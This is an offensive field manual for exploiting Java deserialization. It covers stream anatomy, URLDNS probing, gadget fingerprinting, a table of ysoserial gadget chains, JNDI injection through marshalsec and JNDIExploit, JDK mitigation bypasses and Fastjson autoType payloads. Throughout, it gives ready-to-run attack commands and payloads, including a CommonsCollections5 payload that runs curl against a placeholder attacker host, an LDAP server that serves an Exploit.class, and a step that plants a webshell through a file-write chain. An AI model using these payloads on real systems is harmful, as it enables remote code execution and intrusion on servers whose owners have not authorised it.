# Java Deserialization — the full field manual

## Stream anatomy — `AC ED 00 05` then TC_* tokens

```
AC ED          magic
00 05          version (always 5)
74             TC_OBJECT
  72           TC_CLASSDESC → class name + serialVersionUID + fields
    71         TC_REFERENCE → back-pointer to earlier handle
    70         TC_NULL
    76         TC_STRING → utf string
    75         TC_ARRAY
    73         TC_CLASS
    79         TC_ENDBLOCKDATA
    78         TC_BLOCKDATA (opaque bytes)
    7A         TC_RESET
    7E         TC_EXCEPTION
```

`tools/java_ser.py payload.ser` (or `--b64 rO0AB...`) walks this into a
class inventory — every `TC_CLASSDESC` name + `serialVersionUID`, every
`TC_STRING`, and it flags known-gadget classes. Analysis only — never calls
`readObject`.

## What fires, in order

`ObjectInputStream.readObject()` instantiates the object graph lazily, but
during the read it invokes, on each deserializing class:

```
readObject()         custom read logic — FIRST HOOK, most gadgets live here
readResolve()        substitute the result object — runs after fields
defaultReadObject()  implicit field fill when no custom readObject
readExternal()       Externalizable classes — arbitrary code by design
validateObject()     registered validation callback
finalize()           later, GC — unreliable as a trigger
```

The chain game: a top-level collection's `readObject` calls `hashCode()` /
`equals()` / `compareTo()` / `toString()` on entries — and ONE of those is a
gadget. You rarely call the sink directly; you make the container walk into it.

## The URLDNS first probe — the only zero-dependency chain

```bash
java -jar ysoserial.jar URLDNS http://probe.YOUR-LISTENER/ >urldns.ser
```

`java.util.HashMap.readObject` rehashes keys; a `java.net.URL` key's
`hashCode()` resolves its host — your DNS/HTTP callback fires.
**JDK-only classes = works on every Java deserializer**, so a callback proves
`readObject` ran. No callback means the blob was stored/not-reached, OR
egress is dead — corroborate with a `ClassNotFoundException` probe before
moving on.

## Fingerprinting library versions — before picking a chain

`GadgetProbe` (ysoserial module) sends a probe per known-library class:

```bash
# each probe triggers a callback ONLY if that library+version range is
# on the classpath — narrows which chain will work without a stack trace
java -cp ysoserial.jar ysoserial.exploit.GadgetProbe http://L/ <lib>
```

or brute signal: send a stream whose classdesc names `com.target.Foo` —
`ClassNotFoundException` tells you exactly which classes resolve (version
strings leak through class names like `org.apache.commons.collections.functors.ChainedTransformer`).

## The gadget table — ysoserial chains

| Chain | Library needed | Trigger method family | Notes |
|---|---|---|---|
| URLDNS | JDK only | hashCode→URL resolve | detection only |
| CommonsCollections1 | commons-collections ≤3.2.1 | ChainedTransformer→InvokerTransformer | classic |
| CommonsCollections2 | commons-collections4 4.0 | same family | Java 8u71- blocks |
| CommonsCollections3/4/5/6/7 | commons-collections* variants | same | version-matched |
| CommonsBeanutils1 | commons-beanutils | BeanComparator | no commons-collections needed |
| Groovy1 | groovy | MethodClosure→Process | needs Groovy on classpath |
| Spring1/2 | spring-core + spring-beans | ObjectFactoryDelegatingInvocationHandler | |
| Jdk7u21 | JDK ≤7u21 | AnnotationInvocationHandler→equals | JDK-only, version-gated |
| JRE8u20 | JDK 8u20 | bean-specific | version-gated |
| Hibernate1/2 | hibernate-core | TypedValue getter | |
| Myfaces1/2 | myfaces | | JSF stack |
| Rome | rome | ToStringBean→equals | RSS lib |
| Click1 | click-nodeps | | |
| Vaadin1 | vaadin-server | | |
| JBossInterceptors1 | jboss-interceptors | | |
| JavassistWeld1 | javassist+weld | | |
| JSON1 | json-lib + spring | | |
| AspectJWeaver | aspectjweaver | file write, not RCE | writes a file — different impact |
| BeanShell1 | bsh | | |
| C3P0 | c3p0 | JNDI via PoolSource | pairs with JNDI module |
| FileUpload1 | commons-fileupload+wicket | file write/delete | |
| JRMPClient | JDK | connects to attacker JRMP listener | bootstraps a second-stage exploit |
| JRMPListener | JDK | binds a listener | used by exploiters, not for sending |
| MozillaRhino1/2 | rhino | | |
| Python1 | python (jython?) | | |
| Wicket1 | wicket | | |

### The rule about versions

`serialVersionUID` must match the server's compiled class. A chain for
commons-collections3.1 fails silently against 3.2.2 — the error is a
`local class incompatible` mismatch, not a refusal. Read the exception: it
names the expected `serialVersionUID` and proves the class exists — now you
know the version.

```bash
# wrong: guessing
java -jar ysoserial.jar CommonsCollections1 'id'
# right: read the exception → serialVersionUID mismatch tells you the lib version
#        → pick the chain for THAT version
```

## Sending the payload

```bash
java -jar ysoserial.jar CommonsCollections5 'curl http://YOU/x' >cc5.ser
base64 -w0 cc5.ser          # → the blob
# deliver into the field that held the original rO0AB blob
```

If the field is length-limited (cookie ~4KB) prefer short gadget chains —
URLDNS/CC1 are small; CommonsBeanutils chains are big. `ysoserial.jar` has no
`-b` flag — wrap with `base64 -w0` yourself.

## JNDI injection — the lookup path

```java
InitialContext.lookup(userInput)          // anywhere lookup() takes input
context.lookup("ldap://attacker/x")
```

`InitialContext` resolves `ldap://`, `rmi://`, `dns://`, `iiop://`,
`corbaname:`, `nds:` — each is a remote class-load vector on old JDKs.

```bash
# marshalsec — serves a compiled Exploit.class over LDAP
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
  http://YOUR-HTTP/#Exploit 1389
# the JNDI payload that reaches it:
ldap://YOU:1389/Exploit
```

```bash
# JNDIExploit — auto-serves variants including Tomcat/Groovy bypasses
java -jar JNDIExploit.jar -i YOUR-IP
```

**JDK mitigation ladder** — know it or chase ghosts:

```
≤8u121  remote classloading from LDAP/RMI works by default
8u121+  com.sun.jndi.rmi.object.trustURLCodebase=false default → RMI dead
8u191+  com.sun.jndi.ldap.object.trustURLCodebase=false default → LDAP dead
8u191+  bypasses: Tomcat BeanFactory/ELProcessor local gadgets, Groovy,
        serialized-object attributes, local Factory classes on classpath
11+/17+ JNDI remote codebases fully dead → local factory classes only
```

On a modern JDK, a `ldap://` callback that doesn't fire code is EXPECTED —
pivot to `javaSerializedData` or a Tomcat-builtin factory, or use the
deserialization of a C3P0/`JdbcRowSetImpl` chain which calls `lookup()`
itself with your string.

## Alternative sinks — `readObject` is not the only parser

| Sink | Marker | Tool/generator |
|---|---|---|
| `XStream.fromXML()` | `<class>` tags naming real classes | xstream gadget XML, CVE-2013-7285 family |
| `Hessian` | `C` protocol byte | hessian serialized stream |
| `Kryo` | binary, `0x01` class idx | kryo streams |
| `Fastjson.parse` | `{"@type":"..."}` | `@type` auto-type bypass payloads |
| `Snakeyaml Yaml.load` | `!!javax.script...` | `!!` tag payloads |
| `XMLDecoder` | `<java><object class=...` | XMLDecoder beans XML |
| `Jackson defaultTyping` | `["com.x.Cls", ...]` | polymorphic type payloads |
| `Castor`, `JAXB`, `Json-lib` | typed XML/JSON | per-lib gadget XML |

### Fastjson auto-type — the quick shape

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"ldap://YOU/Exploit","autoCommit":true}
```

`autoType` is deny-list based — bypasses come per version (`1.2.24`→`1.2.80+`
each have a signature trick: `Lcom...;` prefix, `TypeUtils.loadClass`
cache poisoning, double-`@type`). Check the jar version first — a wrong-version
payload silently does nothing.

## The "no gadget on classpath" dead-end and its two exits

1. **URLDNS callback but no RCE chain** → libraries absent. Try JNDI via
   `JdbcRowSetImpl`/`C3P0` if either is there, or `AspectJWeaver` file-write
   to plant a webshell.
2. **No callback at all** → egress blocked. A `ClassNotFoundException` on a
   probe class still proves `readObject` — then only local-impact chains
   (file write via AspectJWeaver/FileUpload1) can land.

## Output to record

- The Java version + the library+version the serialVersionUID leaked
- The chain name exactly as ysoserial spells it + the command it got
- The trigger (`HashMap.readObject` → `URL.hashCode` → lookup, etc)
- Verbatim response or OOB-log line proving the gadget fired
